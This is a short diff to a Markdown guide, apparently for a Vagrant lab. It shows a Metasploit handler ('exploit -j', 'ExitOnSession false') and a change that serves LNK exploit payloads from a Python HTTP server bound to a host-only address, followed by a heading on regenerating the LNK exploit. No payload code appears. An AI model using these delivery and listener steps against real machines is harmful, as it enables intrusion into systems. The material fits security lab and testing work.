@@ -207,8 +207,8 @@ set ExitOnSession false
 exploit -j
 
 # Start HTTP server in another terminal
-cd /vagrant/exploits/lnk
-python3 -m http.server 8080
+cd /home/vagrant/lnk_payloads
+python3 -m http.server 8080 --bind 192.168.56.101
 ```
 
 ### Regenerate LNK Exploit
